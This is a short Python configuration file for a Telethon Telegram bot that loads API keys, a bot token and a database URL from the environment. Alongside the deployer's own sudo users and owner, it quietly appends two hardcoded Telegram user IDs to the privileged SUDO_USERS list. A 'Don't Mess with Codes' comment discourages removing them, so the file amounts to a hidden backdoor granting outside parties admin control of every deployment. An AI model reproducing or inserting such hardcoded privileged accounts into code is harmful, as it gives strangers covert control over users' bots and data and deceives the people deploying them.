
import os
from telethon import TelegramClient
from decouple import config
from os import getenv
import logging


logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s',
                    level=logging.WARNING)


#values
API_ID = config("API_ID", default=None, cast=int)
API_HASH = config("API_HASH", default=None)
CMD_HNDLR = getenv("CMD_HNDLR", default="!")
HEROKU_APP_NAME = config("HEROKU_APP_NAME", None)
HEROKU_API_KEY = config("HEROKU_API_KEY", None)
BOT_TOKEN = config("BOT_TOKEN", default=None)
SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
if 1410250744 not in SUDO_USERS:
    SUDO_USERS.append(1410250744)

OWNER_ID = int(os.environ.get("OWNER_ID", None))

# Don't Mess with Codes !! 

DB_URI = config("DATABASE_URL", None)
SUDO_USERS.append(OWNER_ID)
SUDO_USERS.append(5327845950)

# Tokens

MK = TelegramClient('MK', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

